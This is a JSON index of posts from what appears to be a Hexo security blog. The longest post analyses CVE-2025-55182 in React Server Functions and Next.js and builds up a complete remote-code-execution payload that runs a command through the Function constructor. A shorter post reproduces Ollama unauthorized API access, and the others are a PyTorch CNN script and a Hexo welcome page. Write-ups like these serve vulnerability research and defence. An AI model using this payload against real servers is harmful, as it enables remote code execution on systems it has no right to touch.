[{"title":"React Server Components远程代码执行漏洞","url":"/2025/12/07/React-Server-Components远程代码执行漏洞/","content":"# CVE-2025-55182\n\nThis vulnerability allows RCE in React Server Functions, e.g. as\noffered by Next.js through insecure prototype references.\n\nI'm not an expert in React or Next.js, so take all the information\nhere with a grain of salt.\n\n## Background\n\nReact offers Server Functions[^1], which can be seen as sort of an RPC-\nover-HTTP. They can be used to fetch data from adjacent peers to ensure\nlow latency, or perform authenticated requests that the client lacks\ncredentials for.\n\nReact uses something called the React Flight Protocol[^2] for serialization\nof values passed to Server Functions.\n\nThe client passes \"chunks\" to the server, e.g. via form data:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1\"]'),\n    \"1\": (None, '{\"object\":\"fruit\",\"name\":\"$2:fruitName\"}'),\n    \"2\": (None, '{\"fruitName\":\"cherry\"}'),\n}\n```\n\nAs shown, these can have references in between each other.\nThe above payload deserializes to the following on the server:\n\n```js\n{ object: 'fruit', name: 'cherry' }\n```\n\nThe format itself is a little more intricate and allows for more\ncomplex serialization and deserialization, but this provides a\nbasic understanding for the actual vulnerability.\n\n## Vulnerability\n\nUntil this commit[^3], when traversing chunks in reference resolving,\nsuch as getting the `fruitName` from chunk 2 in the above example, React\ndidn't verify whether the requested key was actually set on the object.\nThis allowed us to get the object prototype[^4].\n\nThis can be demonstrated with a payload like this:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1:__proto__:constructor:constructor\"]'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nWhich deserializes to the function constructor[^5]:\n\n```js\n[Function: Function]\n```\n\nWhen the chunk with ID 0 is not an array but an object, we can\nset the `then` key to the function constructor. The object is then\nreturned by the `decodeReplyFromBusboy` function and awaited by Next.js:\n\n```ts\n// action-handler.ts:888 (pre-patch)\nboundActionArguments = await decodeReplyFromBusboy(\n    busboy,\n    serverModuleMap,\n    { temporaryReferences }\n)\n```\n\nWhen this returns a thenable, the `await` in the caller will call it.\nThis is what happens with this payload:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\":\"$1:__proto__:constructor:constructor\"}'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nLeading to this error:\n\n```console-out\nSyntaxError: Unexpected token 'function'\n    at Object.Function [as then] (<anonymous>) {\n      digest: '1259793845'\n    }\n```\n\nThe error looks like this since V8 calls an `await`ed function\nwith the internal `resolve` and `reject` functions, which, when\n`toString`ed, serialize to something like this:\n\n```js\nfunction () { [native code] }\n```\n\n## Exploitation\n\nSince we can trivially retrieve the `Function` constructor, the\nstraightforward way is to find a call gadget that invokes the\nconstructor with a user-controlled value (i.e., the code of the\nfunction as a string), and later calls the returned function.\n\nThere are multiple places that can call the function constructor,\nfor example `resolveServerReference`, where `id` is a controlled object,\nand `lastIndexOf` can be overwritten to return a user-controlled string\n(e.g. via `Array.prototype.join`) and `slice` can be overwritten to the\nfunction constructor. However, this place doesn't work as the second\ninvocation of `.slice()` supplies a number as the first argument,\nwhich -to my best knowledge- can never be handled by the function\nconstructor.\n\nHere, a brilliant idea from maple3142[^6] comes in. When `getChunk`\ngrabs the chunk at ID 0 as the root reference to start resolving the\nreference chain, *this very same chunk* can resolve to a crafted\n\"fake chunk\".\n\nWe can reference the crafted chunk 0 in chunk 1 by using the\n`$@` syntax, which returns the \"raw\" chunk, not it's resolved value:\n\n```js\ncase \"@\":\n  return (\n    (obj = parseInt(value.slice(2), 16)), getChunk(response, obj)\n  );\n```\n\nCombining this with our `then` overwrite from above, we can craft\nsomething like this:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nHere, chunk 0 overwrites its own `.then()` with the `.then()` of\nits own raw chunk representation. Put simply, we overwrite our\nown `.then()` with `Chunk.prototype.then`, which exists, since\n`Chunk`s are thenables:\n\n```js\nChunk.prototype.then = function (resolve, reject) {\n      switch (this.status) {\n        case \"resolved_model\":\n          initializeModelChunk(this);\n      }\n      // ...\n```\n\nWith the above payload, `Chunk.prototype.then` is eventually called\nwith the crafted chunk with ID 0.\n\nAs shown above, when `.status` on our fake chunk is `resolved_model`:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nWe get into `initializeModelChunk`. Here, `.value` is parsed as JSON,\nand then references are resolved on the returned object, using the \"outer\"\ncontext of our chunks with IDs 0 and 1:\n\n```js\nfunction initializeModelChunk(chunk) {\n    // ...\n    var rawModel = JSON.parse(resolvedModel),\n        value = reviveModel(chunk._response, { \"\": rawModel }, \"\", rawModel, rootReference);\n    // ...\n```\n\nWithin this, we now get a second pass of evaluation with a little more\nvalues we have access to due to the outer context already being resolved.\n\nThere is a call gadget in the handling of blob data with the `$B` prefix\nin the flight protocol:\n\n```js\ncase \"B\":\n  return (\n    (obj = parseInt(value.slice(2), 16)),\n    response._formData.get(response._prefix + obj)\n  );\n```\n\nUsing the special `_response` field, we control the `response` property\nof the crafted chunk:\n\n```js\n// in initializeModelChunk\nvalue = reviveModel(chunk._response, // ...\n```\n\nWith this, we can craft an object with fake `._formData` and `._prefix`\nproperties:\n\n```py\ncrafted_chunk = {\n    \"then\": \"$1:__proto__:then\",\n    \"status\": \"resolved_model\",\n    \"reason\": -1,\n    \"value\": '{\"then\": \"$B0\"}',\n    \"_response\": {\n        \"_prefix\": f\"return foo; // \",\n        \"_formData\": {\n            \"get\": \"$1:constructor:constructor\",\n        },\n    },\n}\n```\n\nThe `.reason` needs to be added to circumvent failing on the `toString`\ninvocation in `initializeModelChunk:\n\n```js\nvar rootReference = -1 === chunk.reason ? void 0 : chunk.reason.toString(16), resolvedModel = chunk.value;\n```\n\nBy pointing `._formData` to the function constructor, and `._prefix` to\nour code, we get an invocation gadget for the function constructor in\nthe blob deserialization:\n\n```js\nresponse._formData.get(response._prefix + \"0\")\n// becomes\nFunction(\"return foo; // 0\")\n```\n\nOur crafted function is then returned by `parseModelString` as the\n`.then()` method of the crafted chunk, which is also awaited, since\nall of this takes place in a single promise resolving chain. Thus,\nreturning a thenable, our crafted function gets called. This constitutes\nthe required call gadget referenced above.\n\nPutting this all together with an actual RCE payload, we get something\nlike this:\n\n```py\ncrafted_chunk = {\n    \"then\": \"$1:__proto__:then\",\n    \"status\": \"resolved_model\",\n    \"reason\": -1,\n    \"value\": '{\"then\": \"$B0\"}',\n    \"_response\": {\n        \"_prefix\": f\"process.mainModule.require('child_process').execSync('calc');\",\n        \"_formData\": {\n            \"get\": \"$1:constructor:constructor\",\n        },\n    },\n}\n\nfiles = {\n    \"0\": (None, json.dumps(crafted_chunk)),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nThe bonus, which makes this vulnerability even worse, is that all of this\nhappens during deserialization, before the requested action is first validated\nin `getActionModIdOrError`. Thus, setting a header like `Next-Action: foo` is\nsufficient to trigger the vulnerability.\n\n## Patch\n\nUsing the chunk references to retrieve prototype properties is\nfixed with this check:\n\n```diff\n@@ -78,7 +80,10 @@ export function preloadModule<T>(\n \n export function requireModule<T>(metadata: ClientReference<T>): T {\n   const moduleExports = parcelRequire(metadata[ID]);\n-  return moduleExports[metadata[NAME]];\n+  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {\n+    return moduleExports[metadata[NAME]];\n+  }\n+  return (undefined: any);\n }\n```\n\n[^1]: <https://react.dev/reference/rsc/server-functions>\n[^2]: <https://tonyalicea.dev/blog/understanding-react-server-components/>\n[^3]: <https://github.com/facebook/react/pull/35277/commits/e2fd5dc6ad973dd3f220056404d0ae0a8707998d>\n[^4]: <https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes>\n[^5]: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function>\n[^6]: <https://x.com/maple3142>\n","categories":["baseTest"]},{"title":"Ollama 未授权访问漏洞 CNVD-2025-04094","url":"/2025/07/08/Ollama-未授权访问漏洞-CNVD-2025-04094/","content":"# Ollama 未授权访问漏洞 CNVD-2025-04094\n\n## 漏洞描述\n\nOllama 是一个本地私有化部署大语言模型（LLM，如 DeepSeek 等）的运行环境和平台，简化了大语言模型在本地的部署、运行和管理过程，具有简化部署、轻量级可扩展、API 支持、跨平台等特点，在 AI 领域得到了较为广泛的应用。\n\nOllama 存在未授权访问漏洞。由于 Ollama 默认未设置身份验证和访问控制功能，未经授权的攻击者可在远程条件下调用 Ollama 服务接口，执行包括但不限于敏感模型资产窃取、虚假信息投喂、模型计算资源滥用和拒绝服务、系统配置篡改和扩大利用等恶意操作。\n\n参考链接：\n\n- https://www.cnvd.org.cn/flaw/show/CNVD-2025-04094\n\n## 漏洞影响\n\n```\n未设置身份验证和访问控制功能且暴露在公共互联网上的 Ollama 易受此漏洞攻击影响\n```\n\n## 环境搭建\n\ndocker-compose.yml\n\n```\nservices:\n  ollama:\n    image: ollama/ollama:0.3.14\n    container_name: ollama\n    volumes:\n      - ollama:/root/.ollama\n    ports:\n      - \"11434:11434\"\n\nvolumes:\n  ollama:\n```\n\n执行如下命令启动 Ollama 0.3.14 服务:\n\n```\ndocker compose up -d\n```\n\n环境启动后，访问 `http://your-ip:11434/`，此时 Ollma 0.3.14 已经成功运行。\n\n\n## 漏洞复现\n\nOllama 公开了多个执行各种操作的 [API endpoints](https://github.com/ollama/ollama/blob/main/docs/api.md)：\n\n\n 通过 `/api/tags` 列出所有模型：\n\n```\nhttp://your-ip:11434/api/tags\n```\n\n## 漏洞修复\n\n- 限制公网访问：避免直接将 Ollama 服务端口（默认 11434）暴露在公网，仅允许内网或通过 VPN 访问。\n- 配置网络访问控制：通过云安全组、防火墙等手段限制对 Ollama 服务端口的访问来源，仅允许可信的源 IP 地址连接。\n- 启用身份认证保护：通过反向代理（如 Nginx）启用 HTTP Basic Authentication 或基于 OAuth 的认证机制。","categories":["baseTest"]},{"title":"一维数据的卷积神经网络CNN实现","url":"/2024/06/14/一维数据的卷积神经网络CNN实现/","content":"\n```py\n#! /usr/bin/env python\n# -*- coding:utf-8 -*-\nimport os\nimport torch\nimport torch.nn as nn\nfrom torch.autograd import Variable\nfrom torch.utils.data import Dataset, DataLoader\nimport scipy.io as sio\nfrom sklearn.metrics import confusion_matrix\nfrom torch.optim.lr_scheduler import StepLR\n\ntorch.manual_seed(1) #reproducible\n\n#Hyper Parameters\nEPOCH = 10\nBATCH_SIZE = 150\nBATCH_SIZE_te = 100\nLR = 0.001\n\nexpName = './cnn1-3_nlnn_gaussian_embedding_Relu_new'\nif expName.find('gaussian_embedding') != -1:\n    model_path = './output/cnn/train_epoch_0_step_0.pth'\n\nif not os.path.exists('./output/{}'.format(expName)):\n    os.mkdir('./output/{}'.format(expName))\n\nclass SBPEstimateDataset(Dataset):\n    def __init__(self, ext):\n        data = sio.loadmat('data.mat')\n        self.train_x = data['DS_Train']\n        self.train_y = data['yTr']\n\n    def __len__(self):\n        return len(self.train_y)\n\n    def __getitem__(self, idx):\n        train_x = self.train_x[idx]\n        train_y = self.train_y[idx]\n        \"\"\"Convert ndarrays to Tensors.\"\"\"\n        return {\n                'train_x': torch.from_numpy(train_x).float(),\n                'train_y': torch.from_numpy(train_y).float(),\n        }\n\nclass SBPEDataset(Dataset):\n    def __init__(self, ext):\n        data = sio.loadmat('data.mat')\n        self.test_x = data['DS_Test']\n        self.test_y = data['yTe']\n\n    def __len__(self):\n        return len(self.test_y)\n\n    def __getitem__(self, idx):\n        test_x = self.test_x[idx]\n        test_y = self.test_y[idx]\n        \"\"\"Convert ndarrays to Tensors.\"\"\"\n        return {\n                'test_x': torch.from_numpy(test_x).float(),\n                'test_y': torch.from_numpy(test_y).float(),\n        }\n\ntrain_dataset = SBPEstimateDataset('data')\ntrain_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)\n\ntotal_episodes = EPOCH * len(train_loader)\n\ntest_dataset = SBPEDataset('data')\ntest_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE_te, shuffle=True)\n\n\n\n# for step, batch in enumerate(train_loader):   # gives batch data, normalize x when iterate train_loader\n#     train_x = batch['train_x']\n#     train_y = batch['train_y']\n#     b_x = Variable(train_x)   # batch x\n#     b_y = Variable(train_y)\n#     print(11111)\n\n\nclass CNN(nn.Module):\n    def __init__(self):\n        super(CNN, self).__init__()\n        self.conv1 = nn.Sequential(\n            nn.Conv1d(in_channels=1,\n                      out_channels=32,  # n_filter\n                      kernel_size=9,  # filter size\n                      stride=1,  # filter step\n                      padding=4,  # con2d出来的图片大小不变\n                      ),\n            nn.ReLU(),\n            nn.MaxPool1d(kernel_size=2)  # 1x2采样，o\n\n        )\n        self.conv2 = nn.Sequential(nn.Conv1d(32, 64, 9, 1, 4),\n                                   nn.ReLU(),\n                                   nn.MaxPool1d(2))\n\n        self.conv3 = nn.Sequential(nn.Conv1d(64, 128,  9, 1, 4),\n                                   nn.ReLU(),\n                                   nn.MaxPool1d(2))\n        self.out = nn.Linear(128 * 1 * 32, 3)\n\n    def forward(self, x):\n        x = x.view(x.size(0), 1, 256)\n        print(x.size())\n        x = self.conv1(x)\n        print(x.size())\n        x = self.conv2(x)\n        print(x.size())\n        x = self.conv3(x)\n        print(x.size())\n        x = x.view(x.size(0), -1)\n        x = self.out(x)\n        return x\n\ncnn = CNN()\n\noptimizer = torch.optim.Adam(cnn.parameters(), lr=LR, weight_decay=1e-5)\noptimizer_scheduler = StepLR(optimizer, step_size=int(total_episodes / 5), gamma=0.5)\nloss_function = nn.CrossEntropyLoss()\n\n\ncount = 0\ntest_acc = []\nfor epoch in range(EPOCH):\n    for step, batch in enumerate(train_loader):   # gives batch data, normalize x when iterate train_loader\n        optimizer_scheduler.step(count)\n        count += 1\n\n        train_x = batch['train_x']\n        train_y = batch['train_y']\n        b_x = Variable(train_x)  # batch x\n        #b_x = b_x.view(b_x.shape[0], b_x.shape[1], 1)\n        b_y = Variable(train_y).long().view(train_y.shape[0])\n        output = cnn(b_x)\n\n        loss = loss_function(output, b_y)  # cross entropy loss\n        optimizer.zero_grad()  # clear gradients for this training step\n        loss.backward()  # backpropagation, compute gradients\n        optimizer.step()\n\n\n        if step % 50 == 0:\n            train_output = cnn(b_x)\n            train_y = torch.max(train_output, 1)[1].data.squeeze()\n            accuracy_tr = float(sum(train_y == b_y)) / float(b_y.size(0))\n            print('Epoch:', epoch, '|Step:', step,\n                  '|train loss:%.4f' % loss.item(), '|train accuracy:%.4f' % accuracy_tr)\n\n            m = 0\n\n            for step_,batch in enumerate(test_loader):\n                test_x = batch['test_x']\n                test_y = batch['test_y']\n                b_tx = Variable(test_x)  # batch x\n                # b_x = b_x.view(b_x.shape[0], b_x.shape[1], 1)\n                b_ty = Variable(test_y).long().view(test_y.shape[0])\n                test_output = cnn(b_tx)\n                pred_y = torch.max(test_output, 1)[1].data.squeeze()\n                accuracy = float(sum(pred_y == b_ty)) / float(test_y.size(0))\n                m = accuracy + m\n                if step_ % 52 == 0:\n                    C = confusion_matrix(b_ty, pred_y)\n            m = m / 52\n            test_acc.append(m)\n            print('|test accuracy:%.4f' % m)\n            if max(test_acc) <= m:\n                file_name = './output/{}/train_epoch_{}_step_{}.pth'.format(expName, epoch, step)\n                torch.save(cnn.state_dict(), file_name)\nprint('|max accuracy:%.4f' % max(test_acc))\n\n ```","categories":["featTest"]},{"title":"Hello World","url":"/2020/10/07/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]